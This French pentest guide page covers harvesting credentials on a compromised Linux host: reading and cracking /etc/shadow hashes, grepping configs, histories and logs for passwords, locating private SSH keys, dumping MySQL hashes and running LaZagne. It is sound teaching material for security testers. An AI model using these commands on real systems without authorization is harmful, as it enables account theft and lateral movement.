# Extraction de credentials Linux

Sur Linux, les credentials sont principalement stockees dans `/etc/shadow` et peuvent etre trouvees dans des fichiers de configuration, des historiques, des bases de donnees, et des cles SSH. L'extraction est souvent plus directe que sur Windows, a condition d'avoir les privileges necessaires.

## Pourquoi

Apres avoir obtenu un shell sur un systeme Linux, recuperer les credentials permet de pivoter vers d'autres machines, d'escalader les privileges, ou de decouvrir des acces a des services internes (bases de donnees, applications web, serveurs distants).

## Comment ca marche

### Processus d'authentification Linux

| Composant | Role |
|---|---|
| **PAM** (Pluggable Authentication Modules) | Framework modulaire d'authentification |
| `/etc/passwd` | Liste des comptes (lisible par tous) |
| `/etc/shadow` | Hashs des mots de passe (lisible par root uniquement) |
| **NSS** (Name Service Switch) | Resolution des noms d'utilisateurs et groupes |

Le fichier `/etc/shadow` contient les hashs au format `$type$salt$hash`.

| Prefixe | Algorithme | Hashcat mode |
|---|---|---|
| `$1$` | MD5 | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `$y$` | yescrypt (systemes recents) | 13400 |

## En pratique

### Extraire les hashs de /etc/shadow

```bash
# - Lire /etc/shadow (necessite root)
cat /etc/shadow

# root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
# admin:$6$rounds=5000$salt$hash...:19000:0:99999:7:::

# - Combiner passwd et shadow pour John (format compatible)
unshadow /etc/passwd /etc/shadow > combined.txt

# - Casser avec John
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# - Ou avec Hashcat (mode 1800 pour SHA-512 crypt)
hashcat -a 0 -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
```

{% hint style="info" %}
SHA-512 crypt avec 5000 iterations est nettement plus lent a casser que du NTLM. Un GPU moyen tourne a environ 50 000 H/s sur du SHA-512 crypt contre plusieurs milliards sur du NTLM. Les mots de passe complexes peuvent etre incassables en temps raisonnable.
{% endhint %}

### Recherche de credentials sur un systeme compromis

{% tabs %}
{% tab title="Fichiers de configuration" %}
```bash
# - Rechercher des mots de passe dans les fichiers de config
grep -rni "password" /etc/ 2>/dev/null
grep -rni "password" /var/www/ 2>/dev/null
grep -rni "password" /opt/ 2>/dev/null

# - Fichiers courants contenant des credentials
cat /var/www/html/wp-config.php        # WordPress
cat /etc/mysql/debian.cnf              # MySQL
cat /etc/openvpn/*.conf                # OpenVPN
cat /etc/freeradius/3.0/clients.conf   # FreeRADIUS
```
{% endtab %}
{% tab title="Historiques et logs" %}
```bash
# - Historique des commandes
cat ~/.bash_history
cat ~/.zsh_history

# - Rechercher des commandes avec des mots de passe en argument
grep -E '(pass|pwd|secret|token)' ~/.bash_history

# - Logs applicatifs
grep -rni "password" /var/log/ 2>/dev/null
```
{% endtab %}
{% tab title="Cles SSH" %}
```bash
# - Rechercher des cles privees
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

# - Rechercher toutes les cles privees par en-tete
grep -rn "BEGIN.*PRIVATE KEY" /home/ /root/ /etc/ssh/ 2>/dev/null

# - Verifier les authorized_keys (connexion sans mot de passe)
cat /home/*/.ssh/authorized_keys 2>/dev/null
```
{% endtab %}
{% tab title="Bases de donnees" %}
```bash
# - Rechercher des fichiers SQLite contenant des credentials
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# - Dump des credentials d'une base MySQL
mysql -u root -e "SELECT user, authentication_string FROM mysql.user;"

# - Firefox/Thunderbird (profils locaux)
find / -name "logins.json" 2>/dev/null
```
{% endtab %}
{% endtabs %}

### Outils specialises

```bash
# - LaZagne : extraction automatique de credentials
# Supporte les navigateurs, connexions WiFi, SSH, bases de donnees, etc.
python3 laZagne.py all

# - linPEAS : enumeration complete (inclut la recherche de credentials)
./linpeas.sh
```

### Fichiers specifiques a verifier

| Emplacement | Contenu potentiel |
|---|---|
| `/etc/shadow` | Hashs des mots de passe systeme |
| `~/.bash_history` | Commandes avec mots de passe en argument |
| `~/.ssh/id_rsa` | Cles privees SSH |
| `/var/www/*/config*` | Credentials de bases de donnees |
| `/etc/crontab` | Scripts cron avec credentials |
| `~/.gnupg/` | Cles GPG |
| `/tmp/` | Fichiers temporaires avec credentials |
| `.env` | Variables d'environnement applicatives |

## Pieges et galeres

- **yescrypt** : les systemes recents (Debian 12+, Ubuntu 24+) utilisent yescrypt par defaut. C'est significativement plus lent a casser que SHA-512 crypt
- **Sudo sans mot de passe** : meme sans casser le hash, un sudo mal configure (`NOPASSWD`) peut donner un acces root direct
- **Cles SSH sans passphrase** : une cle SSH non protegee trouvee dans `/home/user/.ssh/` peut donner un acces direct a d'autres machines
- **Tokens applicatifs** : les tokens d'API, cookies de session et JWT trouves dans les fichiers de configuration peuvent avoir plus de valeur que les mots de passe systeme

## Memo express

| Commande | Usage |
|---|---|
| `cat /etc/shadow` | Lire les hashs (root) |
| `unshadow /etc/passwd /etc/shadow > combined` | Format compatible John |
| `john --wordlist=rockyou combined` | Casser les hashs |
| `hashcat -m 1800 hashes rockyou` | SHA-512 crypt avec Hashcat |
| `grep -rni "password" /etc/` | Chercher des credentials |
| `find / -name "id_rsa"` | Chercher des cles SSH |
| `python3 laZagne.py all` | Extraction automatique |

***
